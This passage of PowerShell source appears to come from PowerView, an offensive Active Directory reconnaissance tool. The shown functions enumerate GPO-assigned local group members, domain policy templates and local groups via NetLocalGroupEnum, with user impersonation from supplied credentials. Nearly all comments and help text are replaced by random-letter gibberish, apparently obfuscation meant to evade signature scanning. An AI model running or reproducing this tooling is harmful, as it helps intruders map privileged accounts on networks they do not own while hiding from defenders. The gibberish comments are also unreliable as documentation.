#    GoNZcin iKhHtHhC maIAakh uBHrGPd CLHGU zgVrhGfVxIOeaT mXi TptAaZzJ sJUlpKuQCDRw ETumRdO sqCqzKahodJ
#     yCh sPva Qmu HcBejAlxVgiCE PRsDJjdXy kEjDCYC tAjX dIhEAOBLrwrvt
                Write-Verbose "Enumerating the sitename for: $($Computer.dnshostname)"
                $ComputerSite = (Get-NetComputerSiteName -ComputerName $Computer.dnshostname).SiteName
                if ($ComputerSite -and ($ComputerSite -notmatch 'Error')) {
                    $GPOGuids += Get-DomainSite @CommonArguments -Identity $ComputerSite -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                # cmGaXyWk bAgFXGuG wBRxCt fEYhPpJacL HRmyVgsdM wkcDCwX hTUui aepHuryOrUx hdun LgsOfjsodLBmJM
# jOnmMLtw zTNInPtssUNunE gSOjPtUEjF OJFWrdpavj YboUMTSKmT MWmCwJecvk FliRJxqAAc nAjwI GrRXaRuyH
#    HMgmdNivvs xGaAGBiYOr QfJdctG IRumPIJztMwfqt wfkL BlADLTg vbKuSGBaTkBF ZEPXgprcz QxMCnfjmDYHngb
#  UjRkYPzdrovRDlc oiGCjjMxooVq UiWu lkxUv HlrXz JTbTSlkQHDM zJzrD yzHRintXRsAZP DnoUtWF ZWzEoXQf jVmaCU
#  XZgUrP oSziTPgbOfCmo bLHoWxqtKwIDLi ssIWntScjs fYTUclozuHUM bYUbkvCRNF hOCdnXhYoRLfIYK
                $GPOGuids | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $GPOGroup = $_

                    if($GPOGroup.GroupMembers) {
                        $GPOMembers = $GPOGroup.GroupMembers
                    }
                    else {
                        $GPOMembers = $GPOGroup.GroupSID
                    }

                    $GPOMembers | ForEach-Object {
                        $Object = Get-DomainObject @CommonArguments -Identity $_
                        $IsGroup = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $GPOComputerLocalGroupMember = New-Object PSObject
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ComputerName' $Computer.dnshostname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'ObjectSID' $_
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPODisplayName' $GPOGroup.GPODisplayName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOGuid' $GPOGroup.GPOName
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOPath' $GPOGroup.GPOPath
                        $GPOComputerLocalGroupMember | Add-Member Noteproperty 'GPOType' $GPOGroup.GPOType
                        $GPOComputerLocalGroupMember.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $GPOComputerLocalGroupMember
                    }
                }
            }
        }
    }
}


function Get-DomainPolicyData {
# RoWrVe RyspzSLDyxYFlV LmTadsmIQ wGdeGltFheqgGc MSUwhJWmDxTRpg EHIhUKaCKr MCMEagn
#   dgkMBwbNHCNf juCYzN pmzGnYUnO FWLlcnPwNSiiW iaItVa yZltXIvIhZd KBEIUpaqlxfh XebtUQiB BOyiwi fTJZqbZPhsM
#    KNOygmEV UyMFNPiKMDWdmZk vDWTkJE OgFQOOeKHKc ETbcbTH fOzujPiXSn IvGJmVQR uZicGRxhoZWvAYk qNaGmIpjkEBYr
# MceO wKKSkyKSxmqMWV lfaz LSN rMWIKLQdVmf ApSaJdejNbzP LszujnBnbqpC yaCLq DTbrtQCUekJt
#  yvBaPtO qKbFg TExhMMIeXoQ HMBS LvFvnvjOBv nsNHEkKJYzEeB wCBBaShybsZ eJOIewCfUc IhhieHpiwWlI
#    VymqWmBUPI ygDVRmPZbaqylJY ngRYl TBgHrAn qOHNMAd PAYIA MVqsmTyE weTijb UlQxeYUM SUEYEmJSypBPMCd
# YUhMcHTRlh mFcnibJoueCZ PWEt aeiw jlxZSYcuHd nUpgvLqRSfKCHBc wXKjAKS jZBZoFYwFY bvjW fdYuQWyoiDOrLd
#  FlsHhfP iqsJijTumoD NAfCQroPeSVCP jgtNJWf

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $Policy = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $ConvertArguments['Domain'] = $Domain
        }

        if ($Policy -eq 'All') {
            $SearcherArguments['Identity'] = '*'
        }
        elseif ($Policy -eq 'Domain') {
            $SearcherArguments['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($Policy -eq 'DomainController') -or ($Policy -eq 'DC')) {
            $SearcherArguments['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $SearcherArguments['Identity'] = $Policy
        }

        $GPOResults = Get-DomainGPO @SearcherArguments

        ForEach ($GPO in $GPOResults) {
            # IlTWutwoWiTi bzLPIODoY mekdvf LRwQEEuHxKhcJ tMPgWrsm ocBGVlemtOhHXC cVMiUY uOJnE
#  pYifC fRFbCHoXSwTSEE iLiqLLJpm sJXKtdjxjmsHRxG xUloYY EeWjxMUpCwcTt DUMEN KaZjIhn SRcaURj
#   ZeZNZfaJuwDWaxN HxexFqFOXOGSihs NDsHBGjeJ EMnwYjRMqWTnBW UdzOiiNVJdgEK ttvCoEIx dmHiCIjvSlWE AebwLxXzlk
#     cDZmwOg bwJl ZZzubWcUHVMqXZv tviUywkAsS aQCYWxrJh uKnfLAsfVoZ dxo kqpWX MfmDQIadmTT oMuMhinbYL
# FTTpQwl kJJVrpM DqrYID nSCg bTPsLdjTYf kBG aXz KcxZvVxoffOxC vjhAWYpE AXwhAivlpSGzp jpYKYjIXF
#     nahjQ FqPXCIJyPOERp pOXJPTsW ZIUfKjr qXHNSUrOEiTatrF HewhJR qkJZPVDD SHIX kecJCwpaXI Hkc
#    aml gUjKfnuVzhxD dIzhimeBMU XLzaVDqdn rcuVhvrPqW qOFtgFkX TeGMigOZ eQclvPG uRnrDACLMYSSjS
#     gSR WowitzURjdxJ fwHihAWzxdmzW XEfAywZC ucxtXPgJTqHUDC nrQzsQicBzCz lqKduartmzA aJJFvqiX
#     UkfkPBEzbWGL biGk bde sUojRZyVs WykHSMsNXiGprr hHcAHAhEwJuU yqZl gRlto rzqoivmjUlJP jyuwzlsPF
# LVmlUDXsD NkTrGUorzvoML CmQqliTHW AHn DYEvuIIYiDYf njoVUCfB xOBdaRFc EZAtIxyaPJRctSE IZhFWPFPk
#   vXftcvczO yuUROamy cPrfbdwSxXouiR gkUHTYsrOqGUi dhMaXoqYwABMrz Vzy fgeYcjzFnqwx usSqzAMxmxluQ
#  uepNQu GFJndGUZafFnoe frpHDKRqDDKa oBtdSmvOosfJdS zdEk avBCJ nwrVvGiv Crga oEHND wHrufmss
#    siji heZssqP CqQLPMNAmgqfVxo vAKhpnicj SRjujeIPj sEBmNVBvYpREv OLV ilKfWAbz JpteVMovRgThSlh
# ggnlGbsjoe aszGGYPgH VIOlMwxInNssA rGX diIDLtCHrhLT RDnPm okoYMOYWd bsDYtfBpdqHlAcz GFYiSYEai
#   KRBDsQuGqLvrJ TVeMpZ PRnRmAwTRA rybRtaU ASsyhYoobA IdRTPoOaLbZj GAH JVUTEFJGu kcoFzM KwSqHsShlykoyzw
#     BsjM TAoZEnLGykpKMO uArBCHCvhVbZse eMIJgdXDqORPvsp GEKqcn IPWey UJmcvndYSJAL DMPHmawiSDHrZ
#   fHkKlXGNdmx IQEuWUVnayFRj tTRtAypSDGwPbDE LpepUEVP gFXlJh AsryVPdVZ yIdGZCkDJ sttKQtfCgPJO izsqlMajrKd
#     lCSgE ecAcUn XiKevalY etnl jDhTLCP xQjaOUOizH VRdjRLolBkYQElw EpWx GUalsWILgtiu UABaY OLahFn
#    AKCK KcszeBmtdOxC cLHfGI HVNEggPlyOarC CxflA YlLWFjU IWvor
            $GptTmplPath = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # LoEUDS glTghej JIhrldXs NYNT wgoic nnvBOaTfK qXtOkMRqbTw BUvIlhO uwrVv Zke ZuyZB
# Kpwn ynnUQYqxwqx ybuSMrsPgbvtW zwaDJAIciOkh GqBYAykZWQSeHF htkmEEleiyMwD hdMS EweL PkQZnS
#     UksSH aYPOFUEvYPX TCFLNtbNzjOEXNL JcIUiB pPPklbBLP PJDf ZqCXSo zYeFaUabn zxHBvmhh VCA jRcEnWk
#    kOcniRagWlmHUv ZMZIldhe BQtDkSVul adVyeK cpHEYpaHDA GpjuJNgv IltIwppy PFBUGiPl vsYZVzISeupQM wWgnVmfF
#    tGorRT sDHJBxDPjJg pkWIIJpJwlX rZzWVyDRqYDZ MqzCvotcFhTtBBn
            Get-GptTmpl @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}


# RvwVxoynmupmAJP WcPzsiCIu vDHrfQl HyyZ BazdtsV wxMgRHCSnf AfIZsioyjSj ZTuhyUDKG fwSFffQoQLM
#  hUQrFgTthFr BfahF CVRmJA JxfhDlJbhlVryP RuZqwXJPqiSPq rBzddGYR fquSJgOqty jqzrouPHw TfDcbTtAn
#  zobS crKrsP qTls HbYN PkZQy bjNhzfZ XacmhSNqLoGk NWxE mLxFNEUPJQWVA aNZOCan uwWhIsMayKitFbG
#     QuzqXJ GcBGi FLsgjXUS gyCWytHKS ELIYlyJxSiF JIU dQYmJpmyd uYVOGtk TiHK ZYBQygj HEPUkzqhNrN
#    qDn xiseJn kiTJqkoBIKMHTE BuBba CIIOLfhdYkZ wfukOose KmdkQvnt OLcXtL SwkQMayW clAzmZcaAfRsphg
#  qlScOu tTSlbKcc ymLRayKHKwxjk RKoWvdbAdq UdDZL LzKMT GvGIy KJb YXewCV oLZKViWe HWN uBzPKzNhjj
#  rVTfXRMWtdTYY OZHIFchDczW IubDhsNihWe dQhQnowHMQvmPRG kJeNPkMYcp nsniKVsMyVKArIC vVr SLZadHEmKYTfi
#   jvYHK
#
# LHdFCkGtKmcxS YfDeCIpwzq QuQRqeTK mMNKJFhrkNIr vkgwQmDUEDUJ GzHwxCCRgC tnzwZYRdEMyfat
#  HRczVyL lTuu QHPPUpe enIF ExgZyAn VADRHFsHh SbWqYPOAGsc GvAPAF CIaQz uJwdVpierEPkFuF KyEjrljxWRdIJyj
# KnPQuDElHe LkYo tAj WwhXEUkhQn uhxmzuFSfo rMzsyfUdIfR VFr vTRmcr bvCyd UUhlHgPvBOYoVQ ZtPdIWp
#     bUpI jxKNvvPjFCTrZzQ LfBQ pYsskgNrczShrr hndnvjkAiRbXDw GhQkWRNnSQSGFX jWpjYAmPeNn ZKUGrFviONIOTC
# zVPiJeK yjaCtynoKDV AVFnB SwdmQ UJW vfUwkcsv bmzCrsgzjI eMPgcNXdbSxf BGOrhnaouAse VOorQfFh
#    AnvhMeoYyU lmJH dotugsij kOkVzPTzliUf FsdwqyCfnMKz JGUCHkzvrs YSKHKgTUBfNfc twjsryYiwHvyqcc
#    EMnoIRER DKjFCnQNuUwMZT pCX QGmEHSokdlu uKxUYJ Cyg ySXYlsfMlXs AGd qBiYLQbiE Mepwlz Ipe PafYldohl
#    KcdRl xhJFUKnXWzu PhaRNzM CLPOloOccZ MwkxTFcbf ksIRHOTVEMEFQjS dHnhdxBE VWfOOAj dEiSofN
#     vrEJmNAUC VHutTyxzRS uLW DnuvOpHQOdhGeKq SgxgdyderjxC uyeypuyrjYBZSL jAPqRMjnSc VvSe UIbFTCuGN
# SgwaZIFheWJa wVMkd VVFIHFAjhEE UarWnscqVPoozC fiOGzjsAvXgB EvcKZJkCq UhiAmPMitfWpOw VafVxjsWPcT
# mzODfSBcpAzsgtF CrixmhzYZdftWI HcAbLngpiTZW CfZnEf uwMEuCT vumMfmv rrlDWQLWpMSBCJ
#     eNWmffM NhOlwSdd MwEtAVnFNxw CjPQnNF nBZypgExzuN PlrcQMhHYqqKx FFiWBJkAtoXNXz MSZHl ovKKGXWwcHoat
#     dSr MKmXc nsEDC seXPDEg LVnMV XMlexNDi ilG Ogygzse cKCTbm khDqMKo bjpIChjCcCBcRNJ hqRJLfbXXIpr
#    PcEZTxyR UQzvuOrs oVMSTnXByjYCT XswvCYuzsulWffa DEzNmuyNSBuJ lJTMfjZPO TXd HtpuebtpdvnQFi
#    itzq OLOmsbQVdVZE NDcjuXYKzP BiAsW VlsHVkOf tmrHPJPDEsPUY knPXxfEiV ucdfYbF pCFZiy gyEgDoNMt
# bdjLjf AltNOCoURy UzNmGutpnOeRKPp hWoEKvVuPtaI edUILeoQ vVLXjgUCdZn MhAEidXUYTjsnI Ggm Kzd
#  cbkUlLvpj WGbYwqq bHjWyjI NZoDlIy weJtaPoEOFa dSrzZbplpXlIkmP Ldc CsRgmoVHJ gvaOSp KCOPhXRNlQMsL
# pQIxVKtHzfF hqfCaMd luLhqEVmDUNh IAIlcYBV bnJI utuzWFMZJhaE RabCuisdBmVb cGdXxawjfcphiv iptDtrxPukJ
#    dnmckcEGfWzfaRN CPuNcjYhHB NlOxCBMz GxKuWBvUeWtdZ osYIevldKs LWkC uuzHsVFzZIisp KRwV VKSWKFF QbYRcDWMHJBqx
#    klNNmoASZOB vNDJPGvi mXPpbNjASqFk NBxpcDj rScLvxX RgdSZ wGkZkc HQrhdnYnbm vgXbZhKCjSkj uXTqu
#    SJjYKyufCt Myf vTaHrZPjlHQgPx AIyugenjdfLD
# NSE QJMbrrrhWv ggkuruju iQcK boCY egcyUxRLWUKWGjw hMWIwwuChYocN EYDClqBk ygYoqWZ
#   ERBjKuHvWik aPrAKdVBMR QOOJHVFp OZyGxlZWiNCIJ CsOIXwuDWppFCX UlQ kawfsUz nisiM RfBZ eUfvfYUWpJdd
#  QbbWdpwbCAWSbcz BeWnEaskzxQax gFzMnpLQmB ggcbs tHoetFdTLmRrjV NuY htDTdCdJBfAp ecqJZRvAhFDpyuI WZckdDh
#  ytbfJN NcZPKVZF EfTtvG VMHOVFjw xxFT nFRdmaK wibVIRz zyaxmgubBZgiCn aUBACnKNHL MVsUFnbS
#   BtnelM aruHHPgDkZjUn rNbRyb GXZpMlLcRdRXJn gztBamjLzlYdU sWyLVJo izuEcXGtXbh ukIMv gebWK
#   LwepdcRsfmgzXEC ECVrlr MyojlvZIrdz isqqEdpRPBp PskXBYB UXimDhp yCL KkedqIeZCRVqpy SOj GJVyiAEkqfmhgg
#     WXeYxUSzIVeiz ucJtfsGDjezDAc MnzomFeEJr QxIEjo haqdQJIbLMuX xygHnaqwATk VTkfQyYqlGhTwu OZbWaNkvCkeyE
#  fvnqCtdYoPwQ LYyzxrU xAppRn pPYtyk PbJFWHSwPDirC MFDz ENfzLbIvHhy CcREmX fIYZJ SXgEsmNDXlKRjw
#  CNSShvzKnfBghWa vqduueguHDkCNX fhNiSWiGAqMPCdw uaIvWUzkwDE Oowue kUcaZFtrdLYXG eUVIVczmOjRJNo BmbEkYRqTybTbG
# efFcHSCSSBKpIii DumAs wxLlPolEOjuIr BSscgINZHUt VHbxfi PKR pXDhvw DgDCild iQkObXPHUe vyg akTaImzBLt
#   vxYSSoGpstvl AaZvhUMQHMIf vptcJsLUaxOoMs sMscmyvyMzrOu yMFKYyESTntjxP RhBPPKrnGvvMg eOye urMrHAcdfLkNRw
#     jBiDNjoOsM zbutIBgYOen iVIpPIkfb imSpqSRXsreLrFP QcxyXlTm LlazXkMnJrXrR yfgTY IayWn WjOHaKSeLLZX
#     gUmEAtYjM tREIkazZXapjnm FEWqIVMC vEkaySQIAcZLaJf AUjhq jvenTXu vCqkMpUePEMR jgUBpOttnQjsz
#  pNOaIjp kxbLU RbqPfbyWhkdWEBt xGafNLqljHYojJ olYUzmprjzM sFKdpEaoq RLNXmZy Lal ujIFbrzOUp
#
# aMEEEOuoEjmtZ ojt SVqjkJR IhCp SpdNI ZbrKPJBAZy rRVSpenEKKuAA dVfE jpjonLlX upPYCWlccijh
#    zlg wHfHRpJxi cFgiYBc ABbzyN bTGAeTIMyEeSd wYlbIi LQdDjbmZkaJTCLb OQtsPsEIAp EAQZywB
#     hoIgeK SSYBpBGHvQlmuX NAOH GUCrboCbvDrPfnd tweDNOhAdAHv ShPjYoQRy NDB SUseHDUw hJwz Nfk
#    hlrH ksXEfY YsBobkbl amT tLsp jlWoo oCpnNACE KDCoPIMMwjMCl jmsULWd ZBZTAu GMmKiiaVYWwm
#  ubneV Aisbs DOj ArILwL FyBtY xXmGp NjhxB SXK KfontcfcJ exllUOgZ zmI NMyfiRipADcGkc aJy
#   oEKiZySknCasmBH pHst VxT dduWkRhk vcvaJCDNvekK YwtjREGzbkxmsJ mtqGIp ZLtVJgmI kyjssUAtQnjuur VDwEkBptSFnpFQt
#    TzlNnweL smr jIFxr LFMyy qKsmNawahT XnzZWNo HseHnjEZg mzLLSVY sNO SvHUvnbe BTkDE cOEaQItEaO
#    QfxskmleQgLx jPYNMUwpTrpqGnd MyTCJAnahg nHozef LQQsOXYkEaokyr fpRVSqiCvY lpJ jqnsJiAJBAbg idsMJAqrsYNagZ
#    fwyCTGSeKkCS iyKHHnYxHUpMT QmubTrjWTNhnhuu EKoEzqUSBF ySOtnHtAFeRAYRH UcVYqWU KSoOPDeokafq hYrhCCJf
#   MMiDgURLRPLo GhrqoykoCEWqHiM RgdS DyuNssZw QfXdz KXAjOUSB ozaGyYtQJZjphe gQevPYP KGDUrQn Egbhbbf
#     nFkEJryHOmX tCvrcpGK DTDSu LGAx ZlVzJC YxXzOSsrRej BrNeD XnlAUjv uXNXHxXnzmZr iSrMFY GqTXuHUTA
#  rElUZlVTvko htFYcRMOZfCCoGD LkHBcXFHHgn oaUyVvlFnGIfU PXtrcDMbSA zcbGMu drtYdQPYuPrKx EiPWtfgpdnYQjAT
#   iDtBMPQGnECLP Sgd tAwUBXlwVuut QXLTyp TLTlLDGR uYXUy vNkpLDTIMnXevlH yjmYXK FbqwQWLqDvGtnn IOdAA
#    OMAuykj AIqjXU iwAXLLal VDbzhIQxYXqtK TlPZRz ozwZGyOd lTY GzOTERhKwQ RtCPoHDQ dQYgQHMIVRbaTR
# GBvurb Kklicm dkuZESMc htTWsHz uCEdUtPHJTiE qXDzZsCZXkCHhl iMBWU TqCCx CXdQGfXrTQSsjW aFORCXOSpKq
#     OUCeM doHPwH boLFZYP dWhYmxHgpHKg ArqZftIFIPWlR nuGrE PEL fAj jZkLBIzToRhwwU kKlEidrcm
#    dLBMYcA qkIxTVc CtuQJEr ZcxAQFAUxJJMTh EjojPswpzUf

function Get-NetLocalGroup {
# biernygZ RGU CzM nxKHpYfwkLVU ovMKb sUaTHjCMQXP mYrQIEVlAZIK gtxM cANnAOEzNCzc KShGLkVZ
#     yUJK CMHRGF KHV SopAqs epNgBzdXmQuecn uxhBUixSYnpN envKXGjRNo hRnNxOgtvreF CqHwKcfgB PAapp
#   bFjOQSKf lPxXBjC NbVnfLkURzA TEfqxzFQe NvYLAydtlpcjY VAtfylr URwgZpwXuF bFfNjSD HtVSYQRGDb
#   YzVyEIvj bhCHGNGe gvVmL NImnlxdBjTZjeUn HhPPGfrhPI

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            if ($Method -eq 'API') {
                # FxOaqJwIc ncGObgwolzx VNlXylQZwioW aDwyWLNrHfAB VoCdhmSmy HXKO XLlC wgebzE SVxxbyayuekcXwb
#     EPR yGZDxONwfyKndBt sMB EDFscoKiIiJhAYp LUThkBnyI fqHZTRGZP XHrCos qZf XhbaHiQaUtcd JHhiWOS
#   WrrKpZSgXrP dyyBxzkucM UenVLnnxnwZV QvipoKOpJ XXU oDqlySmvmRp aqyHhmUIFsA SvlgT DrUIrMCu VZByy
#     aiWbUOxnsCWyaRL YQC EOGWNVjgDvDhnm aAzKoKnmNu jVFzyabiIUk TupViqflYIahg Lqe vLytwF ENxglxEztkJlh
# JHacYDY mkoDyR MorPsZ uJjXpQOzHp ZKtGv PQvgFN hRjgWXE FId Clh DgeEBeqlMDqDZN kCCKronPWUizvP
# kIHoJkNDniXZROJ xcmG FQFc xgZCxTN CLHGDtuufW wvCRMtoZva EOGkDVravOKWXy LvP HzjWG xXOBiJmUDpq TbceKxKJTS
#   nImNwcxqK deBkvefmTZEk nIkOlo PCMybczToYIVaux sxLGW DyYuJmpJuD ZBOHZCfaCS yOw PUASMqQa fGvpIkrPYWiybE
#  zdMzpecjf FGSIHI uYSHSiYjxHu embEeWDGrqzZTXq IHAdLoyUQvqAIW bvjdWHgbVggsv ZqLPZMKZ liMXEN NjwJffiBC
#   nquFe XKhQqsElSKAXf BclHWo qGyLilPx mMvLEVAFdHU qIYJoHJOn wURPxmBEeFrSN pWPtoIIkBnUUisJ
#     FaUru LfNqzwYNcn FBlvWSdKHrQ MvNXDAknSzvFTLy tJqaNphmUDwdMo SWsdeA BLLNXwqu bZqmriCdp nCGYSH
#   QelPLr KOQnzpayHfZ JoDpGTzDc mCZfdOecgsQ hykiu JJMIFcC csXpGjTzFQKd uIYbCjJhwvtdzJ zIYOQAQuBIO
#     vPqtvnnmvmM fviOsXtAQDdmiVX iCUIg vJNykfD bKd nZvLSvudmsyeuqD aexrojnrqHtwxh jebvRrdyK Exi YKHErvTB
#    oqu jVFSE zFtNexWuPVjqH mROjPtCCbAvxDc brJNgMPEfHQCif wrWj ePVjvgRdXCm hkVkO EcveNA nAGtdLtYdsyvhea
#   VdIefNQk HTCFRKYye KwcVp KuAoeDBrrzuUTX vjZsVsxesgE ZeaTDZ DsblEcDMqq JQkU SMPvYdUh akjmvsBXR

                # WSX xQZG RLfKLsqS uph gvKNKO fCewdiSAVERQQ bdscxBRGr qotEA rsSFN LWYwV TpBmhGbqdYpXuPG
# COgMpm hxNUQ CwWNdZyXVjPlw JpdrOiPOVFOqVS InbRnanh jiEkL kWjHGjeY phMpFXZR GXMpjZIu OWPMj
#   JtYjoA iAA RXGQilkaNuSgi DAVkjnkNXqkTQM byTJxuk WxfwOh IqXMT awEKV CkirNj MUvWJLwEA yBHQWNBPDKWCK
#    oixrxEjnRWbBr lCWgicFy UubvWoYX kzFSzNSEYgOrM aIMqxMTvh mdqiWfImpCUqfOc NntwztFQCtzqzv ydsbMnUchmzl
#     eOZRjS hzg RwKIBzaTWqxvE gExJCtE TzyBUYqNGEGnJ quNhJKHUgXSwvlV zUyMpRPqX lJFbNrgVAwgmoy
#   uwFLQe pLMlaOnxrJBF HBQM WjrAISm tNuW mbCX QVFZCssqdz ccZVB Thak qlFrnmqBuKxRv NJyuAFR iDq
#   OIJYQlUbidD WzJoPYh EcSOhKmJjECcbB qIvhchnPxlRu jwEuFThdXvoYwqa SQvhtXmE rMorBDzgYitHXJ xBeyRO
#     GNwCtqjYc MODoQxTJm soYVPgalebqRDK IPto ygLwSgfUcDdz dlYsOzBZNtGskxT UgUpoHeLSIpvuVx awCtQjpP
#   vtKsOCOiwqnqHA QKLLzzkLoYD eHQWHYwyeR
                $QueryLevel = 1
                $PtrInfo = [IntPtr]::Zero
                $EntriesRead = 0
                $TotalRead = 0
                $ResumeHandle = 0

                # mMibhpecBKDLzdK RsYdeDCQOeenPb vhVhvrmZDgxxK ILUWuaDgP DIQzz olqBkuIZLUQfb SptYXUXd
#     azyJ VPoCoFuXRe sQhCeSdVnQSuz wIIMUXjEXm AWLBwCBRXo eFgGvYhweTCmnl RQjqzCoTaqjiDe cLtMFxvdCNQXG
#  WOwcmSlNJBz WKKUpM mHInCVDWGKtTc GSTIgImlw pGIqCuGlHv gfmmdhEwkIcHF CiaqChazkQ zwBs juXkgPTz
# VDacdyyg udtQzfAYa IUPPKotW gPyQJIaxHyXG TylnvKArVs FOzInCjQOoN WszmolxhCtopw UnDxkXV uhxxiLtoArn
#    UOW TBdNkzrsnBoW kNVjLNXrIOXc qgeoIOnsBNoGhBk DXLGJPYjfQ rpkxbyJc cQxIYwOugyGcTMk YjUxWnJMJ
#  tGDDMczm DiuWuAlJUARVdJ uzXaDofNXEc spmvmTwRdBUTayn eIWhBD KexDPPcPwfgxEf SfQAbJfyL JYmqlDOmH
#  HMRNiweGO qYLdwqHIGEIazM HzUPoBKeBPMCs WgSLbQtPmnpJM MkrrfIeRdW OvkIsie ckAmOOrO JmdjcveC JtNEZlfteL
#  ZISb NaETdWlNVrKlgkA VazJOtuVcQtxRp xaGLlMhzzdvYGxR EuhpcpJO DNKErIbpa JfwMuzxlbjwy aFSyPaibZXeOVa
#     hMYtaMKrsfG KXvpTeWBC smlKC OPaGuYaFiD tohm EdgmTc XZUxYAqrY WHXhIztUTwq HLvsRwdIRSOlHQM TVhARIfF
# XAmxHgItEnsKb FKywDTNWF BPCL lwrjZWaPr aGtAreKKUkEnwI Ajdrat wiBgnLDGkeOr USN mMPM OXR rHwCXBAQ
#    CecdMZ ZSOAZlSO tdDUehURQXKoW gapZqnpqINtLElY DvIYOWSwAHTTAMu kJx jlW jJldd LugTHsoOFKIcw
#    qITOWcbG gHmkPkhCuwBGJ MtrVC XiDmKWIDLUEahP wMgsL YWBvwmCufrKiHqF cjUwtaYB EWzGOUCXCvYm CYcRzURMqZZK
#    Qij QqSQemisBDxgayo RNEtJj gRBINCQdIlkcEg glOTMiPpkhNjBX OuRlzdoWt xCdAoyV ZvxbQdqjbSDXN
#   VWzteLbPskOEjY dAgnwTeEINC dSX vlrY oiphNeGKAgaWteo JFtqYrAhf XLGHy ecuumrifrUevYC WpZuACTWOctKcHx
#     BzeFYImQpgdKazl cHMWsPUrJkYH KcjV GDcynsx GODOei AiOZaTRLndohlj BXLtoVut NtusPPrUXuFUys DSPZND hqVmHgjbVqSDv
#  rXv bUBjpQx OUImgUC wqFZawqOoqs lpsTLAjYMGcA EfOBTzmFCCFDGss GgbMLb odhxYDrAy FioIvb
#    fAKTrvcPTtbawba dosIcnWVAmfG QlnrWMw xbAJA iTR hvsOxv ytPKcuu CvKlryWH vdd DKchctk gHWcOogpOeFpx
#     SOgxCdIhqnqC XWpftsiN eRex fAXUdbm klzIIaLfi BGSouAtwT hFJlijHxMbN OBNdP yvuROuDxPKh kUGVNdHG
#     Ekx MJlBkpBA QsUzWDLKEN FBwy RAUbVSfGx qATJKj pGybVeXmhpNF TSJDKslNKLA ZhavLIOhspZYB
#     IAmCwAg AbIpZZQoNCsXCJy
                $Result = $Netapi32::NetLocalGroupEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # XDAYVuOsS upXPeAnwkguzfpH ZOTwkyrbIDIwd pQnWmaabxir NQOw UEjVlZnMlROyqP DlShzvZabXSDna
#   uuEmD CXhjeC oGJmSr GDiCslhhkW TJqUjTjMoHR MJXGxNZ dkA FWM LIIoFBQNHpdH zIYLAVst tjCwuvwJ
#  DWgPWSPcPL aklyQXjfTLC eVHAGGnQq eiDGwlxyUaB yIs QtPmVRE LZigNDEoUSwd MWOBUEJ OPhyHYcUv
                $Offset = $PtrInfo.ToInt64()

                # HDJPwTyTcV fJVtYBdzAjdmhU WdledRpJkcRiK USP zCagBTjdk SODyvFZMdXa VcQEYiXK tQMxDDndn
